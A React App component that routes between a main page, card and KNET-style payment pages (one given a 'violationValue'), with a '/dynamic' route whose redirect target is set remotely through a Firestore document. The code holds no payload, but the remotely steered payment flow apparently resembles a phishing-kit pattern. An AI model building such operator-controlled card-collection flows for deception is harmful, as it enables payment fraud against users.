"use client"

import { BrowserRouter as Router, Routes, Route, Navigate } from "react-router-dom"
import { useEffect, useState } from "react"
import MainPage from "./pages/main/Main"
import CreditCardPayment from "./pages/payment/payment-methods"
import PaymentSelection from "./pages/payment/payment"
import Ken2 from "./pages/payment/kent/knet2"
import { db } from "./firebase"
import { doc, onSnapshot } from "firebase/firestore"



// Initialize Firebase

function App() {
  const [currentPage, setCurrentPage] = useState<string | null>(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    // Reference to the document containing the current page name
    // Assuming you have a document "settings" with a field "currentPage"
    const docRef = doc(db, "settings", "navigation")
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data()
        setCurrentPage(data.currentPage)
      } else {
        console.log("No navigation settings found in Firestore")
        setCurrentPage("/") // Default to main page
      }
      setLoading(false)
    })

    return () => unsubscribe() // Clean up the listener
  }, [])

  if (loading) {
    return <div>Loading...</div>
  }

  return (
    <Router>
      <Routes>
        <Route path="/" element={<MainPage />} />
        <Route path="/payment/kent" element={<Ken2 violationValue={1} />} />
        <Route path="/card" element={<CreditCardPayment />} />
        <Route path="/payment" element={<PaymentSelection setPage={() => {}} />} />

        {/* Redirect based on Firestore currentPage value */}
        <Route
          path="/dynamic"
          element={
            currentPage === "/" ? (
              <Navigate to="/" />
            ) : currentPage === "/payment/kent" ? (
              <Navigate to="/payment/kent" />
            ) : currentPage === "/card" ? (
              <Navigate to="/card" />
            ) : currentPage === "/payment" ? (
              <Navigate to="/payment" />
            ) : (
              <Navigate to="/" />
            ) // Default fallback
          }
        />
      </Routes>
    </Router>
  )
}

export default App
